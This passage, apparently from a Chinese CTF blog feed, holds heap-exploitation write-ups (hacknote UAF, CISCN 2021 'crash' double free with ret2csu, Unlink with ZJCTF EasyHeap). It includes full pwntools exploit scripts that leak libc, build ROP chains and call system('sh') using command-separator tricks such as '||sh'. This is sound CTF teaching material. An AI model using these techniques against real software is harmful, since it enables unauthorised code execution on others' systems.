-<p>具体利用方式如下</p>
-<p>我们申请两个note,在进行释放</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="http://static.zybuluo.com/hgggg/fmih4vz2wd4oizhkb5tw9pm7/29.png" alt="29.png-24.9kB"></p>
-<p>此时struct note被放到fastbin[0] , content 被放入fastbin<a href="http://static.zybuluo.com/hgggg/fl430uwnapavh55zpng9hj8g/33.png">3</a></p>
-<p>如果我们申请一个大小在fastbin[0]范围内的堆note2,那么note2 的struct note 和 content就会分别是fastbin[0]中的note1,和note0的struct note</p>
-<p>因此新建的note2的strcut note将被分配到note1的结构体位置，note2的content将被分配到note0的结构体位置，note0八字节的结构体处分别存放了打印函数0x804862b和其参数地址，现在将被我们输入的content覆盖</p>
-<p>如果我们将content 覆盖为 __libc_start_main的地址 那么我们就可以泄露 libc 了 , 同理可以梅开二度getshell</p>
-<p>这里还有一个小坑，覆盖后system的参数实际上是从note0结构体开始的，所以要用到system参数截断的姿势，如：&amp;&amp;sh，||sh，;sh;</p>
-<p><img src="http://static.zybuluo.com/hgggg/76xhtazyt1dokdpz0a6xp6gv/30.png" alt="30.png-84kB"></p>
-<p>可以看到最后成功调用了system(‘sh’)</p>
-<h4 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,27510)</span></span><br><span class="line">p=process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Note size :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Content :&#x27;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">libc_start_main = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">8</span>,p32(<span class="number">0x804862B</span>)+p32(libc_start_main))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x18550</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">8</span>,p32(system)+<span class="string">b&#x27;||sh&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="CISCN-2021-西南赛区-crash"><a class="header-anchor" href="#CISCN-2021-西南赛区-crash">¶</a>CISCN 2021 西南赛区 crash</h3>
-<p>这个题和HCTF的fheap，不能说是完全相同，只能说是一模一样了，但当时只有两个队做出来</p>
-<p>这道题在网上的解法一般都是UAF，这里提供一种double free + ret2csu 的思路</p>
-<h4 id="程序分析"><a class="header-anchor" href="#程序分析">¶</a>程序分析</h4>
-<p>ADD</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-102Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-1028h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-1020h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytesa; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4104</span>]; <span class="comment">// [rsp+20h] [rbp-1010h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+1028h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pls give data size:&quot;</span>);</span><br><span class="line">  nbytes = (<span class="keyword">int</span>)getInt();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &lt;= <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, nbytes) == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    nbytesa = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( nbytesa &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nbytesa);</span><br><span class="line">      <span class="keyword">if</span> ( !dest )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="built_in">strncpy</span>(dest, buf, nbytesa);</span><br><span class="line">      *(_QWORD *)ptr = dest;</span><br><span class="line">      *((_QWORD *)ptr + <span class="number">3</span>) = freeLong;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(ptr, buf, nbytesa);</span><br><span class="line">      *((_QWORD *)ptr + <span class="number">3</span>) = freeShort;</span><br><span class="line">    &#125;</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">4</span>) = nbytesa;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_DWORD *)&amp;Strings + <span class="number">4</span> * i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_DWORD *)&amp;Strings + <span class="number">4</span> * i) = <span class="number">1</span>;</span><br><span class="line">        qword_2020E8[<span class="number">2</span> * i] = ptr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The string id is %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;The string list is full&quot;</span>);</span><br><span class="line">      (*((<span class="keyword">void</span> (__fastcall **)(<span class="keyword">char</span> *))ptr + <span class="number">3</span>))(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>freeLong 的汇编代码如下， freeShort 和 它差不多都存在UAF</p>
-<p><img src="http://static.zybuluo.com/hgggg/mk8t3gtc5l76hghd8wst9ent/36.png" alt="36.png-28.6kB"></p>
-<p>主要的漏洞点在Delete</p>
-<p><img src="http://static.zybuluo.com/hgggg/0kdpfqzbu2bg4gev9rppwe3w/37.png" alt="37.png-48.5kB"></p>
-<h4 id="利用方式"><a class="header-anchor" href="#利用方式">¶</a>利用方式</h4>
-<pre><code>    IDA 中可以看到 call puts 与 freeShort 和 freeLong在同一
-页，这样的话如果我们可以利用double free覆盖freeLong的地址的后两位
-为call puts的地址,当我们delete的时候就会调用call puts 打印出字符
-串地址开始的内容，call puts 的地址就在这串内容里，这样可以泄露程序
-基址。
-
-拿到程序地址之后就可以结合double free 利用delete的里溢出来ret2csu
-
-bss段没有足够的空间来写入/bin/sh所以要往data段写
-</code></pre>
-<p>具体不多说(<s>主要是懒</s>)：直接上exp</p>
-<h4 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;crash&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;crash&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;192.168.43.181&#x27;,55000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;add &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Pls give data size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Are you sure?:&#x27;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x0b\x00&#x27;</span>) </span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xd0b</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000000119c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000a80 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000929 : ret</span></span><br><span class="line"><span class="string">0x0000000000000962 : ret 0x2016</span></span><br><span class="line"><span class="string">0x000000000000102b : ret 0x8b48</span></span><br><span class="line"><span class="string">0x0000000000000dd2 : ret 0x8d48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = elf_base + <span class="number">0x11a3</span></span><br><span class="line">puts_plt = elf_base + elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf_base + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf_base + elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_4 = elf_base + <span class="number">0x119c</span></span><br><span class="line">read_got = elf_base + elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_6 = elf_base + <span class="number">0x119a</span></span><br><span class="line">rop2 = elf_base + <span class="number">0x1180</span></span><br><span class="line">bin_sh = elf_base + <span class="number">0x202080</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4)) <span class="comment">#0</span></span><br><span class="line">payload1 = p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_6)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">8</span>)+p64(bin_sh)+p64(<span class="number">0</span>)+p64(rop2)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">56</span>+p64(main)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;yes\x00\x00\x00\x00\x00&quot;</span> + payload1</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4)) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">payload2 = p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(main)</span><br><span class="line">payload2 = <span class="string">b&#x27;yes&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + payload2</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>##参考链接<br>
-<a href="https://blog.csdn.net/qq_35429581/article/details/78231443">https://blog.csdn.net/qq_35429581/article/details/78231443</a><br>
-<a href="https://www.cnblogs.com/luoleqi/p/12343147.html">https://www.cnblogs.com/luoleqi/p/12343147.html</a><br>
-<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698">https://blog.csdn.net/Breeze_CAT/article/details/103788698</a></p>
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Unlink</title>
-    <url>/2021/10/04/Unlink/</url>
-    <content><![CDATA[<h1>Unlink</h1>
-<h2 id="原理介绍"><a class="header-anchor" href="#原理介绍">¶</a>原理介绍</h2>
-<h3 id="unlink"><a class="header-anchor" href="#unlink">¶</a>unlink</h3>
-<p>unlink其实就是把一个双链表中的空闲块给取出来，下面贴一张CTF-wiki上的原理图</p>
-<p><img src="http://static.zybuluo.com/hgggg/sbd9qfl3g1fi9ty3umi38vot/38.png" alt="38.png-123.8kB"></p>
-<p>一般来说就是将链表头处处于free状态的堆块从unsorted bin中脱离出来，<br>
-然后和物理相邻的堆块合并成新的大堆块（向前合并/向后合并），最后再放入到<br>
-unsortedbin中</p>
-<h3 id="unlink-源码阅读"><a class="header-anchor" href="#unlink-源码阅读">¶</a>unlink 源码阅读</h3>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* at malloc.c _int_free */</span></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-<p>在free当前堆块的是后，会先检查其物理相邻的前一个堆块是不是处于释放状态，如果处于free状态则进入判断</p>
-<p>将首先会提取当前堆块的前一个堆块的大小</p>
-<p>将当前堆块的size和前一个堆块的size相加，即合并</p>
-<p>将当前堆块的指针指向前一个堆块</p>
-<p>然后unlink，即将当前的P所指向的chunk从双链表中移除</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;								      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;								      \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="meta-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">else</span> &#123;								      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;							      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;							      \</span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">if</span> (!in_smallbin_range (P-&gt;size)				      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span></span><br><span class="line"><span class="meta">	    <span class="meta-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span></span><br><span class="line"><span class="meta">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">	      malloc_printerr (check_action,				      \</span></span><br><span class="line"><span class="meta">			       <span class="meta-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span></span><br><span class="line"><span class="meta">			       P, AV);					      \</span></span><br><span class="line"><span class="meta">            <span class="meta-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;				      \</span></span><br><span class="line"><span class="meta">                <span class="meta-keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span></span><br><span class="line"><span class="meta">                <span class="meta-keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                  &#125;							      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="meta-keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span></span><br><span class="line"><span class="meta">              &#125;								      \</span></span><br><span class="line"><span class="meta">          &#125;								      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>
-<p>可以看到这里会进行一个检查，判断FD的bk和BK的fd是否指向当前堆块</p>
-<h3 id="Unlink-的绕过和利用"><a class="header-anchor" href="#Unlink-的绕过和利用">¶</a>Unlink 的绕过和利用</h3>
-<p>step1:伪造fake chunk</p>
-<pre><code>chunk = 0x0602040
-P 为我们将要合并的地址,P存在于chunk中，且有*(chunk)=P
-P-&gt;fd = chunk - 0x18 = 0x602028
-P-&gt;bk = chunk - 0x10 = 0x602030
-</code></pre>
-<p>Step2: 绕过检查</p>
-<pre><code>Unlink(P,BK,FD)&#123;
-    FD = P-&gt;fd     // FD = 0x602028
-    BK = P-&gt;bk     // BK = 0x602030
-    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))&#123;
-     // 检查绕过 FD-&gt;bk = *(0x602028+0x18) = *(0x602040)
-     //绕过2 Bk-&gt;fd = *(0x602030+0x10) = *(0x602040)  
-     FD-&gt;bk = BK //*(0x602040) = 0x602030
-     BK-&gt;fd = FD   //*(0x6020240) = 0x602028
-    &#125;
-&#125;
-</code></pre>
-<p>Step3: 劫持程序执行流</p>
-<pre><code>经过上述的步骤，我们已经实现了在*(chunk)中写入了chunk-0x18的值
-如过我向chunk - 0x18 写入__free_hook,在我下一次修改的时候就可以把__free_hook改写为system
-</code></pre>
-<h2 id="列题"><a class="header-anchor" href="#列题">¶</a>列题</h2>
-<h3 id="ZJCTF-2019-EasyHeap"><a class="header-anchor" href="#ZJCTF-2019-EasyHeap">¶</a>ZJCTF 2019 EasyHeap</h3>
-<p>这道题网上的wp大多都是house of spirit 以及 Unsorted bin attack, 这里介绍一种Unlink的攻击方式</p>
-<h4 id="IDA分析"><a class="header-anchor" href="#IDA分析">¶</a>IDA分析</h4>
-<p>add</p>
-<p><img src="http://static.zybuluo.com/hgggg/be6e1prqqmpinvcx751v0xlp/39.png" alt="39.png-43.8kB"></p>
-<p>可以看到add是用一个heaparray的数组来管理堆块的</p>
-<p><img src="http://static.zybuluo.com/hgggg/ebbhnt7xr0p8sxtcrqky20zq/40.png" alt="40.png-19.9kB"></p>
-<p>edit</p>
-<p><img src="http://static.zybuluo.com/hgggg/icy3zhxsx8ifxfjuc1eezl92/41.png" alt="41.png-50.9kB"></p>
-<p>delete</p>
-<p><img src="http://static.zybuluo.com/hgggg/x6npivuk736g3yvmlb5dnw3k/42.png" alt="42.png-32kB"></p>
-<p>同时该题也没开启PIE保护</p>
-<p><img src="http://static.zybuluo.com/hgggg/ksgf2d6r9b7dr7d238ixo334/43.png" alt="43.png-23.7kB"></p>
-<p>这题就非常适合利用Unlink手法来构造exp</p>
-<h4 id="解题思路"><a class="header-anchor" href="#解题思路">¶</a>解题思路</h4>
-<p>Step1:伪造fake chunk</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
-<p>伪造后可以发现此时chunk0处于free状态</p>
-<p><img src="http://static.zybuluo.com/hgggg/e5mmfpfyovlu8qpi6d4c8l4b/44.png" alt="44.png-21.6kB"></p>
-<p>此时我们释放掉堆块1，可以发现堆块0和堆块1成功合并，触发Unlink</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="http://static.zybuluo.com/hgggg/toot7r72l7m2qjirr2sj3sue/45.png" alt="45.png-77.3kB"></p>
-<p>Step2：任意地址写</p>
-<p>可以看到chunk0已经指向了0x6020c8,我们可以通过edit(0)为system最后getshell</p>
-<p><img src="http://static.zybuluo.com/hgggg/5w8ayit4cce7b0if21xr16st/46.png" alt="46.png-38.3kB"></p>
-<h4 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;easyheap&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;easyheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span 